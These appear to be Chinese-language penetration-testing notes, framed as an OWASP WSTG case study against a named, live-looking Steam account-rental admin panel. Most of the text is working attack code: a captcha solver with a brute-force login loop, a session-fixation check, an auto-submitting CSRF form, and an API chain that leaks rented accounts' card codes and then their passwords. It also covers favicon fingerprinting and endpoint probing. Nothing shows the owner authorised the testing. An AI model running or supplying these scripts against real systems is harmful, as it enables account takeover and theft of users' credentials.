# OWASP WSTG 渗透测试实战案例

## 案例：Steam租号系统管理后台测试

### 目标信息
- URL: https://zuhao.steamwukong.com/admin/
- 技术栈: PHP + nginx + 阿里云WAF (ESA)
- 认证方式: 用户名 + 密码 + 数学验证码

### 测试流程

#### 1. 信息收集

```python
import requests, re
s = requests.Session()
s.trust_env = False  # 关代理

# 获取页面结构
r = s.get('https://target.com/admin/', timeout=10)

# 提取表单字段
fields = re.findall(r'name="([^"]+)"', r.text)
# 结果: ['username', 'password', 'captcha']

# 提取验证码格式
m = re.search(r'验证：(\d+)\s*([+\-×÷*])\s*(\d+)\s*=\s*\?', r.text)
a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
ans = a + b if op in '+' else a - b if op == '-' else a * b if op in '×*' else a // b
```

#### 2. 认证测试

```python
# 测试弱密码（无账户锁定）
for pwd in ['1', '12', '123', 'a', 'password', 'admin']:
    r = s.get('https://target.com/admin/', timeout=10)
    m = re.search(r'验证：(\d+)\s*([+\-×÷*])\s*(\d+)\s*=\s*\?', r.text)
    ans = int(m.group(1)) + int(m.group(3))  # 简化
    
    r2 = s.post('https://target.com/admin/', data={
        'username': 'admin',
        'password': pwd,
        'captcha': str(ans)
    }, timeout=10)
    
    if '验证答案错误' in r2.text:
        # 需要新session
        s = requests.Session()
        s.trust_env = False
    elif '密码' in r2.text:
        print(f'{pwd}: 密码错误（允许弱密码）')
```

#### 3. Session Fixation 测试

```python
# 设置攻击者控制的 session ID
s.cookies.set('PHPSESSID', 'attacker_controlled_id', domain='target.com')

# 访问登录页
r = s.get('https://target.com/admin/', timeout=10)
print(f'Session: {s.cookies.get("PHPSESSID")}')  # 应该保持 attacker_controlled_id

# 提交登录
r2 = s.post('https://target.com/admin/', data={
    'username': 'admin',
    'password': 'wrong',
    'captcha': '999'
}, timeout=10)

# 检查 session 是否保持
if s.cookies.get('PHPSESSID') == 'attacker_controlled_id':
    print('[!] Session Fixation 确认！')
```

#### 4. CSRF 测试

```python
# 检查是否有 CSRF token
csrf_patterns = [r'csrf[_-]?token', r'_token', r'authenticity[_-]?token']
found_csrf = any(re.search(p, r.text, re.IGNORECASE) for p in csrf_patterns)

if not found_csrf:
    print('无 CSRF 保护')
    # 生成 CSRF 攻击载荷
    csrf_html = f'''
    <html><body>
    <form method="POST" action="https://target.com/admin/">
        <input type="hidden" name="username" value="hacked" />
        <input type="hidden" name="password" value="hacked123" />
        <input type="hidden" name="captcha" value="999" />
    </form>
    <script>document.forms[0].submit();</script>
    </body></html>
    '''
```

#### 5. Cookie 安全属性检查

```python
for cookie in s.cookies:
    print(f'{cookie.name}:')
    print(f'  HttpOnly: {"HttpOnly" in str(cookie)}')
    print(f'  Secure: {cookie.secure}')
    print(f'  SameSite: {cookie.get_nonstandard_attr("SameSite") or "未设置"}')
```

#### 6. 安全头检查

```python
security_headers = [
    'X-Frame-Options',
    'X-Content-Type-Options',
    'X-XSS-Protection',
    'Content-Security-Policy',
    'Strict-Transport-Security',
    'Referrer-Policy',
    'Permissions-Policy',
]

for header in security_headers:
    if header in r.headers:
        print(f'  {header}: {r.headers[header]}')
    else:
        print(f'  {header}: 缺失')
```

### 发现的漏洞

| ID | 漏洞 | 严重程度 | CVSS |
|----|------|----------|------|
| WEB-001 | Session Fixation | High | 7.5 |
| WEB-002 | CSRF保护缺失 | Medium | 5.0 |
| WEB-003 | 暴力破解防护缺失 | Medium | 5.0 |
| WEB-004 | 弱验证码（数学题） | Low | 3.0 |
| WEB-005 | Cookie安全属性缺失 | Medium | 5.0 |
| WEB-006 | 安全头缺失 | Low | 3.0 |
| WEB-007 | 弱密码策略 | Medium | 5.0 |

### 关键发现

1. **验证码绕过**: 数学题验证码可自动计算，无需OCR
2. **Session Fixation**: PHP服务器接受任意session ID，登录后不重新生成
3. **无暴力破解防护**: 10次尝试后无锁定
4. **CORS配置**: `Access-Control-Allow-Origin: *` 允许跨域请求

## 信息泄露链式利用模式

### 模式描述

当API存在多个信息泄露点时，可以串联利用：

```
1. 过期/无效资源 → API返回关联实体ID
2. 关联实体ID → 查询接口返回当前绑定的凭证
3. 凭证 → 兑换/使用接口获取完整访问权限
```

### 实战案例：租号系统

```python
# Step 1: 过期卡密泄露账号
r1 = s.post('/api/redeem_card.php', data={'card_code': 'EXPIRED_CARD'})
account = r1.json()['last_account']  # 泄露

# Step 2: 账号泄露当前卡密
r2 = s.get('/api/check_account_occupied.php', params={'account': account})
card = r2.json()['detail']['occupation']['card_code']  # 泄露

# Step 3: 卡密获取密码
r3 = s.post('/api/redeem_card.php', data={'card_code': card})
password = r3.json()['password']  # 获取
```

## FOFA Icon Hash 计算

```python
import base64, hashlib, requests

# 下载favicon
data = requests.get('https://target.com/favicon.ico').content

# 计算FOFA hash
icon_hash = hashlib.md5(base64.b64encode(data)).hexdigest()

# FOFA搜索语法: icon_md5="<hash>"
print(f'FOFA: icon_md5="{icon_hash}"')
```

## PHP API 黑盒枚举

```bash
# 已知API目录下批量探测
for ep in admin config test debug info backup export data list stats; do
  code=$(curl -sL -o /dev/null -w "%{http_code}" "https://target/api/${ep}.php")
  [ "$code" != "404" ] && echo "${ep}.php: $code"
done

# 前端JS中提取所有API路径
grep -oE '/api/[a-z_]+\.php' page.html | sort -u
```

## 注意事项

1. **顺序执行**: 安全测试必须顺序执行，不要并行请求
2. **代理问题**: Windows机器需要设置 `no_proxy="*"` 或 `s.trust_env = False`
3. **限频处理**: 遇到429限频时等待30秒再重试
4. **Session管理**: 测试Session Fixation时需要完整验证流程
